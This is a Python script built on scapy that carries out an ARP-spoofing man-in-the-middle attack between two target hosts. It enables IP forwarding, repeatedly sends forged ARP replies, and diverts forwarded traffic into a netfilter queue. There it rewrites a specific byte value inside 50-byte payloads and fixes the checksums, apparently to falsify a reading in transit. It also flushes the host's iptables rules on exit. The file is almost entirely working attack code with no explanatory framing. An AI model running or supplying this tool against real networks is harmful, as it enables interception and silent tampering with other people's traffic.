from scapy.all import *
import sys
from netfilterqueue import NetfilterQueue
import os
import time

def help_text():
    print("\nUsage: python mitm.py target1_ip target2_ip\n")
    sys.exit()

def setSystemFilter():
    print '[*] Routing traffic to nfqueue...'
    iptablesr = "iptables -A FORWARD -j NFQUEUE --queue-num 1"
    os.system(iptablesr)

def resetSystemFilter():
    print("[*] Flushing IP tables")
    os.system("iptables -F")
    os.system("iptables -X")

def recalcChecksum(pkt):
    del pkt[IP].chksum		# recalculated after deletion automatically
    del pkt[TCP].chksum
    return pkt

def modifyPacket(packet):
    pkt = IP(packet.get_payload()) #converts the raw packet to a scapy compatible string

    if pkt.haslayer('Raw'):
        if len(pkt['Raw']) == 50:
            pkt['Raw'].load = pkt['Raw'].load.replace('\xcd\xcc\x1c\x40', b'\x00\x00\x00\x3f')
            print("Packet modified")

    pkt = recalcChecksum(pkt)
    packet.set_payload(str(pkt))
    packet.accept()

def enable_ip_forwarding():
    print "[*] Enabling IP Forwarding..."
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    print "[*] Disabling IP Forwarding..."
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP):
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1, verbose = False)

    if len(ans) == 0:
	print("!!! MAC address is not found")
	disable_ip_forwarding()
	sys.exit(1)

    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def reARP():
    print "\n[*] Restoring Targets..."
    target1_MAC = get_mac(target1_IP)
    target2_MAC = get_mac(target2_IP)
    send(ARP(op = 2, pdst = target2_IP, psrc = target1_IP, hwdst = target2_MAC, hwsrc = target1_MAC), count = 7, verbose = False)
    send(ARP(op = 2, pdst = target1_IP, psrc = target2_IP, hwdst = target1_MAC, hwsrc = target2_MAC), count = 7, verbose = False)
    disable_ip_forwarding()
    print "[*] Shutting Down..."
    sys.exit(1)

def trick(target2_MAC, target1_MAC):
    send(ARP(op = 2, pdst = target1_IP, psrc = target2_IP, hwdst= target1_MAC), verbose = False)
    send(ARP(op = 2, pdst = target2_IP, psrc = target1_IP, hwdst= target2_MAC), verbose = False)

def mitm():
    try:
        target1_MAC = get_mac(target1_IP)
    except Exception:
        disable_ip_forwarding()
        print "[!] Couldn't Find Target 1 MAC Address"
        print "[!] Exiting..."
    	sys.exit(1)

    try:
        target2_MAC = get_mac(target2_IP)
    except Exception:
        disable_ip_forwarding()
        print "[!] Couldn't Find Target 2 MAC Address"
    	print "[!] Exiting..."
        sys.exit(1)

    setSystemFilter()
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, modifyPacket)

    print "[*] Poisoning Targets..."
    while 1:
        try:
            trick(target2_MAC, target1_MAC)
            time.sleep(1.5)
	    nfqueue.run()

        except KeyboardInterrupt:
            resetSystemFilter()
            reARP()
	    break

if __name__ == '__main__':
    if len(sys.argv) < 2:
        help_text()
    interface = "attacker-eth0"
    target1_IP = sys.argv[1]
    target2_IP = sys.argv[2]
    enable_ip_forwarding()
    mitm()
